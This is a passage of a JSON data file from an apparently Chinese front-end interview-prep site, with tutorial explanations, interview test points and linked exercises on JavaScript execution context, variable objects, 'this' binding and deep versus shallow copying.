    "testPoint": "1. **执行上下文的定义**\n   - 什么是执行上下文？它在 JavaScript 中有哪些类型？\n   - 执行上下文在代码执行时是如何被创建和销毁的？\n\n2. **执行上下文的生命周期**\n   - 执行上下文的创建和执行过程有哪些阶段？（例如，创建阶段和执行阶段）\n   - 请描述执行上下文在创建阶段进行的三个步骤：变量对象的创建、作用域链的建立、`this` 的绑定。\n\n3. **变量对象（Variable Object）**\n   - 什么是变量对象？它在执行上下文中的作用是什么？\n   - 变量提升是如何与变量对象关联的？在函数声明和变量声明时有何不同？\n\n4. **作用域链**\n   - 执行上下文是如何通过作用域链来访问变量的？\n   - 请解释在嵌套函数的情况下，作用域链是如何建立的？\n\n5. **`this` 绑定**\n   - 在不同的执行上下文中，`this` 的值是如何确定的？（例如，全局上下文、函数上下文、箭头函数）\n   - 如何解释在不同函数调用方式下 `this` 的指向差异？\n\n6. **执行上下文栈**\n   - 什么是执行上下文栈？它如何管理代码执行的顺序？\n   - JavaScript 引擎如何利用执行上下文栈来实现函数的嵌套调用和返回？\n\n7. **块级作用域的影响**\n   - ES6 中引入的 `let` 和 `const` 是如何影响执行上下文的？\n   - 如何解释块级作用域在执行上下文中的特殊处理？\n\n8. **常见问题与调试**\n   - 如何通过理解执行上下文来排查变量未定义、`this` 指向错误等常见问题？\n   - 请解释某个你遇到的实际问题，以及如何通过分析执行上下文来解决它的。",
    "exerciseKeyList": "[\"c137050b-10f5-4a4f-9941-820ad7a9894d\",\"cf3a9965-7761-4d5e-8b0a-cbde804517b8\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 4,
    "createAt": "2024-11-06T14:35:10.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "c137050b-10f5-4a4f-9941-820ad7a9894d",
        "title": "JavaScript中执行上下文和执行栈是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:51:48.000Z",
        "updateAt": "2024-08-10T17:04:31.000Z"
      },
      {
        "exerciseKey": "cf3a9965-7761-4d5e-8b0a-cbde804517b8",
        "title": "什么是变量提升",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T08:01:55.000Z",
        "updateAt": "2024-07-22T10:52:22.000Z"
      }
    ]
  },
  "153": {
    "id": 153,
    "tagId": 10,
    "title": "变量对象",
    "explanation": "![](https://static.ecool.fun//others/3d976113-b94f-401f-b265-4ca2bb017533.png)\n\n这篇文章要给大家介绍的是变量对象。\n\n在JavaScript中，我们肯定不可避免的需要声明变量和函数，可是JS解析器是如何找到这些变量的呢？我们还得对执行上下文有一个进一步的了解。\n\n在知识点《执行上下文》中，我们已经知道，当调用一个函数时（激活），一个新的执行上下文就会被创建。而一个执行上下文的生命周期可以分为两个阶段。\n\n+ **创建阶段**\n\n在这个阶段中，执行上下文会分别创建变量对象，建立作用域链，以及确定this的指向。\n\n+ **代码执行阶段**\n\n创建完成之后，就会开始执行代码，这个时候，会完成变量赋值，函数引用，以及执行其他代码。\n\n![执行上下文生命周期](https://static.ecool.fun//others/5a094c3e-77e5-4ffe-8247-706ad6a68083.png)\n\n从这里我们就可以看出详细了解执行上下文极为重要，因为其中涉及到了变量对象，作用域链，this等很多人没有怎么弄明白，但是却极为重要的概念，它关系到我们能不能真正理解JavaScript。在后面的文章中我们会一一详细总结，这里我们先重点了解变量对象。\n\n##### 变量对象（Variable Object）\n变量对象的创建，依次经历了以下几个过程。\n\n1. 建立arguments对象。检查当前上下文中的参数，建立该对象下的属性与属性值。\n2. 检查当前上下文的函数声明，也就是使用function关键字声明的函数。在变量对象中以函数名建立一个属性，属性值为指向该函数所在内存地址的引用。如果函数名的属性已经存在，那么该属性将会被新的引用所覆盖。\n3. 检查当前上下文中的变量声明，每找到一个变量声明，就在变量对象中以变量名建立一个属性，属性值为undefined。如果该变量名的属性已经存在，为了防止同名的函数被修改为undefined，则会直接跳过，原属性值不会被修改。\n\n许多读者在阅读到这的时候会因为下面的这样场景对于“跳过”一词产生疑问。既然变量声明的foo遇到函数声明的foo会跳过，可是为什么最后foo的输出结果仍然是被覆盖了？\n\n```javascript\nfunction foo() { console.log('function foo') }\nvar foo = 20;\n\nconsole.log(foo); // 20\n```\n\n其实只是大家在阅读的时候不够仔细，因为上面的三条规则仅仅适用于变量对象的创建过程。也就是执行上下文的创建过程。而`foo = 20`是在执行上下文的执行过程中运行的，输出结果自然会是20。对比下例。\n\n```javascript\nconsole.log(foo); // function foo\nfunction foo() { console.log('function foo') }\nvar foo = 20;\n```\n\n```javascript\n// 上栗的执行顺序为\n\n// 首先将所有函数声明放入变量对象中\nfunction foo() { console.log('function foo') }\n\n// 其次将所有变量声明放入变量对象中，但是因为foo已经存在同名函数，因此此时会跳过undefined的赋值\n// var foo = undefined;\n\n// 然后开始执行阶段代码的执行\nconsole.log(foo); // function foo\nfoo = 20;\n```\n\n\n\n![](https://static.ecool.fun//article/46229532-7887-4884-aec9-69c94f05294d.jpeg)\n\n根据这个规则，理解变量提升就变得十分简单了。在很多文章中虽然提到了变量提升，但是具体是怎么回事还真的很多人都说不出来，以后在面试中用变量对象的创建过程跟面试官解释变量提升，保证瞬间提升逼格。\n\n在上面的规则中我们看出，function声明会比var声明优先级更高一点。为了帮助大家更好的理解变量对象，我们结合一些简单的例子来进行探讨。\n\n```javascript\n// demo01\nfunction test() {\n    console.log(a);\n    console.log(foo());\n\n    var a = 1;\n    function foo() {\n        return 2;\n    }\n}\n\ntest();\n```\n\n在上例中，我们直接从test()的执行上下文开始理解。全局作用域中运行`test()`时，test()的执行上下文开始创建。为了便于理解，我们用如下的形式来表示\n\n```javascript\n// 创建过程\ntestEC = {\n    // 变量对象\n    VO: {},\n    scopeChain: {}\n}\n\n// 因为本文暂时不详细解释作用域链，所以把变量对象专门提出来说明\n\n// VO 为 Variable Object的缩写，即变量对象\nVO = {\n    arguments: {...},  //注：在浏览器的展示中，函数的参数可能并不是放在arguments对象中，这里为了方便理解，我做了这样的处理\n    foo: <foo reference>  // 表示foo的地址引用\n    a: undefined\n}\n```\n\n未进入执行阶段之前，变量对象中的属性都不能访问！但是进入执行阶段之后，变量对象转变为了活动对象，里面的属性都能被访问了，然后开始进行执行阶段的操作。\n\n> 这样，如果再面试的时候被问到变量对象和活动对象有什么区别，就又可以自如的应答了，他们其实都是同一个对象，只是处于执行上下文的不同生命周期。不过只有处于函数调用栈栈顶的执行上下文中的变量对象，才会变成活动对象。\n>\n\n```javascript\n// 执行阶段\nVO ->  AO   // Active Object\nAO = {\n    arguments: {...},\n    foo: <foo reference>,\n    a: 1,\n    this: Window\n}\n```\n\n因此，上面的例子demo1，执行顺序就变成了这样\n\n```javascript\nfunction test() {\n    function foo() {\n        return 2;\n    }\n    var a;\n    console.log(a);\n    console.log(foo());\n    a = 1;\n}\n\ntest();\n```\n\n再来一个例子，巩固一下我们的理解。\n\n```javascript\n// demo2\nfunction test() {\n    console.log(foo);\n    console.log(bar);\n\n    var foo = 'Hello';\n    console.log(foo);\n    var bar = function () {\n        return 'world';\n    }\n\n    function foo() {\n        return 'hello';\n    }\n}\n\ntest();\n```\n\n```javascript\n// 创建阶段\nVO = {\n    arguments: {...},\n    foo: <foo reference>,\n    bar: undefined\n}\n// 这里有一个需要注意的地方，因为var声明的变量当遇到同名的属性时，会跳过而不会覆盖\n```\n\n```javascript\n// 执行阶段\nVO -> AO\nVO = {\n    arguments: {...},\n    foo: 'Hello',\n    bar: <bar reference>,\n    this: Window\n}\n```\n\n需要结合上面的知识，仔细对比这个例子中变量对象从创建阶段到执行阶段的变化，如果你已经理解了，说明变量对象相关的东西都已经难不倒你了。\n\n##### 全局上下文的变量对象\n以浏览器中为例，全局对象为window。  \n全局上下文有一个特殊的地方，它的变量对象，就是window对象。而这个特殊，在this指向上也同样适用，this也是指向window。\n\n```javascript\n// 以浏览器中为例，全局对象为window\n// 全局上下文\nwindowEC = {\n    VO: Window,\n    scopeChain: {},\n    this: Window\n}\n```\n\n除此之外，全局上下文的生命周期，与程序的生命周期一致，只要程序运行不结束，比如关掉浏览器窗口，全局上下文就会一直存在。其他所有的上下文环境，都能直接访问全局上下文的属性。\n\n",
    "testPoint": "1. **变量对象的定义**\n   - 你能解释什么是变量对象吗？它在 JavaScript 中的执行上下文中扮演什么角色？\n   - 变量对象的内容包括哪些类型的变量和函数？\n\n2. **变量对象的创建过程**\n   - 在执行上下文的创建阶段，变量对象是如何初始化的？它是如何通过变量提升来处理变量和函数声明的？\n   - 在函数上下文中，变量对象是否包含函数参数？如果是，它是如何处理的？\n\n3. **活动对象（Activation Object）**\n   - 在函数执行上下文中，变量对象会被激活为活动对象。你能解释活动对象是什么吗？它与变量对象有何不同？\n   - 为什么在代码执行时只能通过活动对象访问变量对象中的内容？\n\n4. **变量提升**\n   - 变量提升是如何在变量对象中实现的？函数声明和变量声明在提升时有何区别？\n   - 解释一个带有变量提升的代码示例，以及在执行上下文中变量对象的创建过程。\n\n5. **全局对象与变量对象的关系**\n   - 在全局执行上下文中，变量对象和全局对象有何关系？为什么可以将全局变量当作全局对象的属性访问？\n   - `window` 对象和全局变量对象的关系是什么？\n\n6. **变量对象中的属性**\n   - 在执行上下文中，`var` 声明、`let` 和 `const` 声明的变量在变量对象中的处理方式有何不同？\n   - 在严格模式下（`strict mode`），变量对象的行为有何不同？\n\n7. **变量对象的应用场景**\n   - 在 JavaScript 代码调试中，如何利用对变量对象的理解来解决变量未定义或意外覆盖等问题？\n   - 能否描述一个你遇到的实际问题，并说明变量对象的知识如何帮助你定位和解决该问题？\n",
    "exerciseKeyList": "[\"1ac5429e-8c75-4ed0-be82-54404bcf4ca6\",\"3e2c519b-9142-40e9-bef6-6b1d975be351\",\"10e0441f-d709-427d-975b-f0026556ae7e\",\"cf3a9965-7761-4d5e-8b0a-cbde804517b8\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 5,
    "createAt": "2024-11-06T14:41:43.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "10e0441f-d709-427d-975b-f0026556ae7e",
        "title": "Redux 状态管理器和变量挂载到 window 中有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-01-16T14:42:13.000Z",
        "updateAt": "2024-08-10T17:06:04.000Z"
      },
      {
        "exerciseKey": "1ac5429e-8c75-4ed0-be82-54404bcf4ca6",
        "title": "全局作用域中，用 const 和 let 声明的变量不在 window 上，那到底在哪里？如何去获取？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:36.000Z",
        "updateAt": "2024-08-14T23:47:54.000Z"
      },
      {
        "exerciseKey": "3e2c519b-9142-40e9-bef6-6b1d975be351",
        "title": "vue3中怎么设置全局变量？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-11T14:34:33.000Z",
        "updateAt": "2024-08-10T17:06:37.000Z"
      },
      {
        "exerciseKey": "cf3a9965-7761-4d5e-8b0a-cbde804517b8",
        "title": "什么是变量提升",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T08:01:55.000Z",
        "updateAt": "2024-07-22T10:52:22.000Z"
      }
    ]
  },
  "154": {
    "id": 154,
    "tagId": 10,
    "title": "全方位解读this",
    "explanation": "我们在学习JavaScript的过程中，由于对一些概念理解得不是很清楚，但是又想要通过一些方式把它记下来，于是就很容易草率的给这些概念定下一些方便自己记忆的有偏差的结论。\n\n危害比较大的是，有的不准确的结论在网上还广为流传。\n\n比如对于this指向的理解中，有这样一种说法：谁调用它，this就指向谁。在我刚开始学习this的时候，我是非常相信这句话的。因为在一些情况下，这样理解也还算说得通。可是我常常会在开发中遇到一些不一样的情况，一个由于this的错误调用，可以让我懵逼一整天。那个时候我也查资料，在群里问大神，可是我仍然搞不清楚“我特么到底错哪里了”。其实只是因为我心中有一个不太准确的结论。\n\n所以，我认为需要有这样一篇文章，来帮助大家全方位的解读this。让大家对this，有一个正确的，全面的认知。\n\n在这之前，我们需要来回顾一下执行上下文。\n\n在前面的几篇文章中，我有好几个地方都提到执行上下文的生命周期，为了防止大家没有记住，再次来回顾一下，如下图。  \n\n![执行上下文生命周期](https://static.ecool.fun//others/c288bd21-1108-423a-bc5e-c7a7a8a20b25.png)\n\n在执行上下文的创建阶段，会分别生成变量对象，建立作用域链，确定this指向。其中变量对象与作用域链我们都已经仔细总结过了，而这里的关键，就是确定this指向。\n\n首先我们需要得出一个非常重要一定要牢记于心的结论，**this的指向，是在函数被调用的时候确定的。**也就是执行上下文被创建时确定的。因此，一个函数中的this指向，可以是非常灵活的。比如下面的例子中，同一个函数由于调用方式的不同，this指向了不一样的对象。\n\n```javascript\nvar a = 10;\nvar obj = {\n    a: 20\n}\n\nfunction fn () {\n    console.log(this.a);\n}\n\nfn(); // 10\nfn.call(obj); // 20\n```\n\n除此之外，**在函数执行过程中，this一旦被确定，就不可更改了。**\n\n```javascript\nvar a = 10;\nvar obj = {\n    a: 20\n}\n\nfunction fn () {\n    this = obj; // 这句话试图修改this，运行后会报错\n    console.log(this.a);\n}\n\nfn();\n```\n\n**一、全局对象中的this**\n\n关于全局对象的this，我之前在总结变量对象的时候提到过，它是一个比较特殊的存在。全局环境中的this，指向它本身。因此，这也相对简单，没有那么多复杂的情况需要考虑。\n\n```javascript\n// 通过this绑定到全局对象\nthis.a2 = 20;\n\n// 通过声明绑定到变量对象，但在全局环境中，变量对象就是它自身\nvar a1 = 10;\n\n// 仅仅只有赋值操作，标识符会隐式绑定到全局对象\na3 = 30;\n\n// 输出结果会全部符合预期\nconsole.log(a1);\nconsole.log(a2);\nconsole.log(a3);\n```\n\n##### 二、函数中的this\n在总结函数中this指向之前，我想我们有必要通过一些奇怪的例子，来感受一下函数中this的捉摸不定。\n\n```javascript\n// demo01\nvar a = 20;\nfunction fn() {\n    console.log(this.a);\n}\nfn();\n```\n\n```javascript\n// demo02\nvar a = 20;\nfunction fn() {\n    function foo() {\n        console.log(this.a);\n    }\n    foo();\n}\nfn();\n```\n\n```javascript\n// demo03\nvar a = 20;\nvar obj = {\n    a: 10,\n    c: this.a + 20,\n    fn: function () {\n        return this.a;\n    }\n}\n\nconsole.log(obj.c);\nconsole.log(obj.fn());\n```\n\n这几个例子需要花点时间仔细感受一下，如果你暂时没想明白怎么回事，也不用着急，我们一点一点来分析。\n\n分析之前，我们先直接了当抛出结论。\n\n在一个函数上下文中，this由调用者提供，由调用函数的方式来决定。**如果调用者函数，被某一个对象所拥有，那么该函数在调用时，内部的this指向该对象。如果函数独立调用，那么该函数内部的this，则指向undefined**。但是在非严格模式中，当this指向undefined时，它会被自动指向全局对象。\n\n从结论中我们可以看出，想要准确确定this指向，找到函数的调用者以及区分他是否是独立调用就变得十分关键。\n\n```javascript\n// 为了能够准确判断，我们在函数内部使用严格模式，因为非严格模式会自动指向全局\nfunction fn() {\n    'use strict';\n    console.log(this);\n}\n\nfn();  // fn是调用者，独立调用\nwindow.fn();  // fn是调用者，被window所拥有\n```\n\n\n\n在上面的简单例子中，`fn()`作为独立调用者，按照定义的理解，它内部的this指向就为undefined。而`window.fn()`则因为fn被window所拥有，内部的this就指向了window对象。\n\n那么掌握了这个规则，现在回过头去看看上面的三个例子，通过添加/去除严格模式，那么你就会发现，原来this已经变得不那么虚无缥缈，已经有迹可循了。\n\n但是我们需要特别注意的是demo03。在demo03中，对象obj中的c属性使用`this.a + 20`来计算。这里我们需要明确的一点是，单独的`{}`是不会形成新的作用域的，因此这里的`this.a`，由于并没有作用域的限制，所以它仍然处于全局作用域之中。所以这里的this其实是指向的window对象。\n\n那么我们修改一下demo03的代码，大家可以思考一下会发生什么变化。\n\n```javascript\n'use strict';\nvar a = 20;\nfunction foo () {\n    var a = 1;\n    var obj = {\n        a: 10,\n        c: this.a + 20,\n        fn: function () {\n            return this.a;\n        }\n    }\n    return obj.c;\n\n}\nconsole.log(foo());    // ？\nconsole.log(window.foo());  // ?\n```\n\n\n\n> + 实际开发中，并不推荐这样使用this；\n> + 上面多次提到的严格模式，需要大家认真对待，因为在实际开发中，现在基本已经全部采用严格模式了，而最新的ES6，也是默认支持严格模式。\n>\n\n再来看一些容易理解错误的例子，加深一下对调用者与是否独立运行的理解。\n\n```javascript\nvar a = 20;\nvar foo = {\n    a: 10,\n    getA: function () {\n        return this.a;\n    }\n}\nconsole.log(foo.getA()); // 10\n\nvar test = foo.getA;\nconsole.log(test());  // 20\n```\n\n\n\n`foo.getA()`中，getA是调用者，他不是独立调用，被对象foo所拥有，因此它的this指向了foo。而`test()`作为调用者，尽管他与foo.getA的引用相同，但是它是独立调用的，因此this指向undefined，在非严格模式，自动转向全局window。\n\n稍微修改一下代码，大家自行理解。\n\n```javascript\nvar a = 20;\nfunction getA() {\n    return this.a;\n}\nvar foo = {\n    a: 10,\n    getA: getA\n}\nconsole.log(foo.getA());  // 10\n```\n\n\n\n灵机一动，再来一个。如下例子。\n\n```javascript\nfunction foo() {\n    console.log(this.a)\n}\n\nfunction active(fn) {\n    fn(); // 真实调用者，为独立调用\n}\n\nvar a = 20;\nvar obj = {\n    a: 10,\n    getA: foo\n}\n\nactive(obj.getA);\n```\n\n\n\n##### 三、使用call，apply显示指定this\nJavaScript内部提供了一种机制，让我们可以自行手动设置this的指向。它们就是call与apply。所有的函数都具有着两个方法。它们除了参数略有不同，其功能完全一样。它们的第一个参数都为this将要指向的对象。\n\n如下例子所示。fn并非属于对象obj的方法，但是通过call，我们将fn内部的this绑定为obj，因此就可以使用this.a访问obj的a属性了。这就是call/apply的用法。\n\n```javascript\nfunction fn() {\n    console.log(this.a);\n}\nvar obj = {\n    a: 20\n}\n\nfn.call(obj);\n```\n\n\n\n而call与applay后面的参数，都是向将要执行的函数传递参数。其中call以一个一个的形式传递，apply以数组的形式传递。这是他们唯一的不同。\n\n```javascript\nfunction fn(num1, num2) {\n    console.log(this.a + num1 + num2);\n}\nvar obj = {\n    a: 20\n}\n\nfn.call(obj, 100, 10); // 130\nfn.apply(obj, [20, 10]); // 50\n```\n\n\n\n因为call/apply的存在，这让JavaScript变得十分灵活。因此就让call/apply拥有了很多有用处的场景。简单总结几点，也欢迎大家补充。\n\n\n\n+ 将类数组对象转换为数组\n\n\n\n```javascript\nfunction exam(a, b, c, d, e) {\n\n    // 先看看函数的自带属性 arguments 什么是样子的\n    console.log(arguments);\n\n    // 使用call/apply将arguments转换为数组, 返回结果为数组，arguments自身不会改变\n    var arg = [].slice.call(arguments);\n\n    console.log(arg);\n}\n\nexam(2, 8, 9, 10, 3);\n\n// result:\n// { '0': 2, '1': 8, '2': 9, '3': 10, '4': 3 }\n// [ 2, 8, 9, 10, 3 ]\n//\n// 也常常使用该方法将DOM中的nodelist转换为数组\n// [].slice.call( document.getElementsByTagName('li') );\n```\n\n\n\n+ 根据自己的需要灵活修改this指向\n\n\n\n```javascript\nvar foo = {\n    name: 'joker',\n    showName: function() {\n      console.log(this.name);\n    }\n}\nvar bar = {\n    name: 'rose'\n}\nfoo.showName.call(bar);\n```\n\n\n\n+ 实现继承\n\n\n\n```javascript\n// 定义父级的构造函数\nvar Person = function(name, age) {\n    this.name = name;\n    this.age  = age;\n    this.gender = ['man', 'woman'];\n}\n\n// 定义子类的构造函数\nvar Student = function(name, age, high) {\n\n    // use call\n    Person.call(this, name, age);\n    this.high = high;\n}\nStudent.prototype.message = function() {\n    console.log('name:'+this.name+', age:'+this.age+', high:'+this.high+', gender:'+this.gender[0]+';');\n}\n\nnew Student('xiaom', 12, '150cm').message();\n\n// result\n// ----------\n// name:xiaom, age:12, high:150cm, gender:man;\n```\n\n\n\n简单给有面向对象基础的朋友解释一下。在Student的构造函数中，借助call方法，将父级的构造函数执行了一次，相当于将Person中的代码，在Sudent中复制了一份，其中的this指向为从Student中new出来的实例对象。call方法保证了this的指向正确，因此就相当于实现了继承。Student的构造函数等同于下。\n\n\n\n```javascript\nvar Student = function(name, age, high) {\n    this.name = name;\n    this.age  = age;\n    this.gender = ['man', 'woman'];\n    // Person.call(this, name, age); 这一句话，相当于上面三句话，因此实现了继承\n    this.high = high;\n}\n```\n\n\n\n+ 在向其他执行上下文的传递中，确保this的指向保持不变\n\n\n\n如下面的例子中，我们期待的是getA被obj调用时，this指向obj，但是由于匿名函数的存在导致了this指向的丢失，在这个匿名函数中this指向了全局，因此我们需要想一些办法找回正确的this指向。\n\n\n\n```javascript\nvar obj = {\n    a: 20,\n    getA: function() {\n        setTimeout(function() {\n            console.log(this.a)\n        }, 1000)\n    }\n}\n\nobj.getA();\n```\n\n\n\n常规的解决办法很简单，就是使用一个变量，将this的引用保存起来。我们常常会用到这方法，但是我们也要借助上面讲到过的知识，来判断this是否在传递中被修改了，如果没有被修改，就没有必要这样使用了。\n\n\n\n```javascript\nvar obj = {\n    a: 20,\n    getA: function() {\n        var self = this;\n        setTimeout(function() {\n            console.log(self.a)\n        }, 1000)\n    }\n}\n```\n\n\n\n另外就是借助闭包与apply方法，封装一个bind方法。\n\n\n\n```javascript\nfunction bind(fn, obj) {\n    return function() {\n        return fn.apply(obj, arguments);\n    }\n}\n\nvar obj = {\n    a: 20,\n    getA: function() {\n        setTimeout(bind(function() {\n            console.log(this.a)\n        }, this), 1000)\n    }\n}\n\nobj.getA();\n```\n\n\n\n当然，也可以使用ES5中已经自带的bind方法。它与我上面封装的bind方法是一样的效果。\n\n\n\n```javascript\nvar obj = {\n    a: 20,\n    getA: function() {\n        setTimeout(function() {\n            console.log(this.a)\n        }.bind(this), 1000)\n    }\n}\n```\n\n\n\n##### 四、构造函数与原型方法上的this\n\n\n在封装对象的时候，我们几乎都会用到this，但是，只有少数人搞明白了在这个过程中的this指向，就算我们理解了原型，也不一定理解了this。所以这一部分，我认为将会为这篇文章最重要最核心的部分。理解了这里，将会对你学习JS面向对象产生巨大的帮助。\n\n\n\n结合下面的例子，我在例子抛出几个问题大家思考一下。\n\n\n\n```javascript\nfunction Person(name, age) {\n\n    // 这里的this指向了谁?\n    this.name = name;\n    this.age = age;   \n}\n\nPerson.prototype.getName = function() {\n\n    // 这里的this又指向了谁？\n    return this.name;\n}\n\n// 上面的2个this，是同一个吗，他们是否指向了原型对象？\n\nvar p1 = new Person('Nick', 20);\np1.getName();\n```\n\n\n\n我们已经知道，this，是在函数调用过程中确定，因此，搞明白new的过程中到底发生了什么就变得十分重要。\n\n\n\n通过new操作符调用构造函数，会经历以下4个阶段。\n\n\n\n+ 创建一个新的对象；\n+ 将构造函数的this指向这个新对象；\n+ 指向构造函数的代码，为这个对象添加属性，方法等；\n+ 返回新对象。\n\n\n\n因此，当new操作符调用构造函数时，this其实指向的是这个新创建的对象，最后又将新的对象返回出来，被实例对象p1接收。因此，我们可以说，这个时候，构造函数的this，指向了新的实例对象，p1。\n\n\n\n而原型方法上的this就好理解多了，根据上边对函数中this的定义，`p1.getName()`中的getName为调用者，他被p1所拥有，因此getName中的this，也是指向了p1。\n\n\n\n\n\n",
    "testPoint": "### 1. **`this` 的定义与作用**\n   - 你能解释 `this` 关键字在 JavaScript 中的含义吗？它通常指向什么？\n   - 为什么 `this` 的指向会随着调用方式而变化？\n\n### 2. **不同调用场景中的 `this` 指向**\n   - **全局作用域**：在全局作用域中，`this` 指向什么？在严格模式下有何不同？\n   - **函数调用**：在普通函数调用中，`this` 的默认指向是什么？在严格模式下呢？\n   - **对象方法调用**：当一个对象调用其方法时，`this` 的指向是什么？\n   - **构造函数调用**：在构造函数中，`this` 是如何指向新创建的实例对象的？\n   - **箭头函数**：箭头函数的 `this` 有什么独特之处？它是如何继承外层作用域的 `this` 的？\n\n### 3. **`this` 的手动绑定**\n   - 请解释 `call`、`apply` 和 `bind` 三个方法的区别，它们如何改变 `this` 的指向？\n   - 举一个实际应用 `bind` 的例子，比如在事件处理程序中绑定 `this` 的场景。\n\n### 4. **事件处理中的 `this`**\n   - 在事件处理函数中，`this` 通常指向什么？如何在 React 等框架中确保 `this` 指向正确的组件实例？\n   - 在复杂的事件绑定中，如何通过 `bind` 或箭头函数解决 `this` 的指向问题？\n\n### 5. **`this` 的动态绑定与调试**\n   - 在闭包或嵌套函数中，`this` 的指向常常会令人困惑。请解释你在这种场景下是如何处理 `this` 的问题的。\n   - 你是否遇到过 `this` 指向意外的情况？请描述具体的场景及如何调试和解决这个问题。\n\n### 6. **框架中的 `this`**\n   - 在 React 类组件中，`this` 是如何被使用的？如何在构造函数中绑定 `this`？\n   - 在 Vue.js 中，`this` 指向的对象是什么？如何避免 `this` 被错误指向？\n\n### 7. **`this` 与闭包的关系**\n   - 在闭包中使用 `this` 时，通常会遇到什么问题？如何利用箭头函数或 `self = this` 的写法解决？\n   - 你在使用闭包和 `this` 的时候遇到过内存泄漏或性能问题吗？如果有，是如何解决的？",
    "exerciseKeyList": "[\"72fbbb97-d04c-48b4-b40e-26a645d28789\",\"9a1251b3-e4e9-4ef6-a960-14d1c399d3c5\",\"dbf9172e-1193-44cb-a534-3c16ae07de2d\",\"33363940-179b-4ae3-9cd3-7bf0a5619df9\",\"e253151b-a880-448b-9cd1-d869971a63e4\",\"fe97f51f-1d7d-49b7-acd2-83f345014633\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 7,
    "createAt": "2024-11-06T14:53:06.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "33363940-179b-4ae3-9cd3-7bf0a5619df9",
        "title": "箭头函数的 this 指向哪⾥？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-22T10:24:18.000Z",
        "updateAt": "2024-07-20T11:56:06.000Z"
      },
      {
        "exerciseKey": "72fbbb97-d04c-48b4-b40e-26a645d28789",
        "title": "哪些原因会导致js里this指向混乱？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-20T11:19:24.000Z"
      },
      {
        "exerciseKey": "9a1251b3-e4e9-4ef6-a960-14d1c399d3c5",
        "title": "改变this指向的方法有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-12-17T09:54:44.000Z",
        "updateAt": "2024-07-19T10:18:44.000Z"
      },
      {
        "exerciseKey": "dbf9172e-1193-44cb-a534-3c16ae07de2d",
        "title": "导致 JavaScript 中 this 指向混乱的原因是什么?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-31T01:15:40.000Z",
        "updateAt": "2024-07-19T10:43:41.000Z"
      },
      {
        "exerciseKey": "e253151b-a880-448b-9cd1-d869971a63e4",
        "title": "bind() 连续调用多次，this的绑定值是什么呢？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-08-10T03:04:35.000Z",
        "updateAt": "2021-08-15T15:28:30.000Z"
      },
      {
        "exerciseKey": "fe97f51f-1d7d-49b7-acd2-83f345014633",
        "title": "谈谈对 this 对象的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:51:18.000Z",
        "updateAt": "2024-08-10T19:49:40.000Z"
      }
    ]
  },
  "155": {
    "id": 155,
    "tagId": 10,
    "title": "深拷贝/浅拷贝",
    "explanation": "浅拷贝和深拷贝都是对于JS中的引用类型而言的，浅拷贝就只是复制对象的引用，如果拷贝后的对象发生变化，原对象也会发生变化。只有深拷贝才是真正地对对象的拷贝。\n\n## 前言\n\n说到深浅拷贝，必须先提到的是JavaScript的数据类型，大家可以看前面的知识点，这里不多说了。\n\n初学前端的同学，需要知道的一点就是：JavaScript的数据类型分为基本数据类型和引用数据类型。\n\n对于基本数据类型的拷贝，并没有深浅拷贝的区别，我们所说的深浅拷贝都是对于引用数据类型而言的。\n\n## 浅拷贝\n\n浅拷贝的意思就是只复制引用，而未复制真正的值。\n\n```javascript\nconst originArray = [1,2,3,4,5];\nconst originObj = {a:'a',b:'b',c:[1,2,3],d:{dd:'dd'}};\n\nconst cloneArray = originArray;\nconst cloneObj = originObj;\n\nconsole.log(cloneArray); // [1,2,3,4,5]\nconsole.log(originObj); // {a:'a',b:'b',c:Array[3],d:{dd:'dd'}}\n\ncloneArray.push(6);\ncloneObj.a = {aa:'aa'};\n\nconsole.log(cloneArray); // [1,2,3,4,5,6]\nconsole.log(originArray); // [1,2,3,4,5,6]\n\nconsole.log(cloneObj); // {a:{aa:'aa'},b:'b',c:Array[3],d:{dd:'dd'}}\nconsole.log(originArray); // {a:{aa:'aa'},b:'b',c:Array[3],d:{dd:'dd'}}\n```\n\n上面的代码是最简单的利用 `=` 赋值操作符实现了一个浅拷贝，可以很清楚的看到，随着 `cloneArray` 和 `cloneObj` 改变，`originArray` 和 `originObj` 也随着发生了变化。\n\n## 深拷贝\n\n深拷贝就是对目标的完全拷贝，不像浅拷贝那样只是复制了一层引用，就连值也都复制了。\n\n只要进行了深拷贝，它们老死不相往来，谁也不会影响谁。\n\n目前实现深拷贝的方法不多，主要是两种：\n\n1.  利用 `JSON` 对象中的 `parse` 和 `stringify`\n2.  利用递归来实现每一层都重新创建对象并赋值\n\n### JSON.stringify/parse的方法\n\n先看看这两个方法吧：\n\n> The JSON.stringify() method converts a JavaScript value to a JSON string.\n\n`JSON.stringify` 是将一个 `JavaScript` 值转成一个 `JSON` 字符串。\n\n> The JSON.parse() method parses a JSON string, constructing the JavaScript value or object described by the string.\n\n`JSON.parse` 是将一个 `JSON` 字符串转成一个 `JavaScript` 值或对象。\n\n很好理解吧，就是 `JavaScript` 值和 `JSON` 字符串的相互转换。\n\n它能实现深拷贝呢？我们来试试。\n\n```javascript\nconst originArray = [1,2,3,4,5];\nconst cloneArray = JSON.parse(JSON.stringify(originArray));\nconsole.log(cloneArray === originArray); // false\n\nconst originObj = 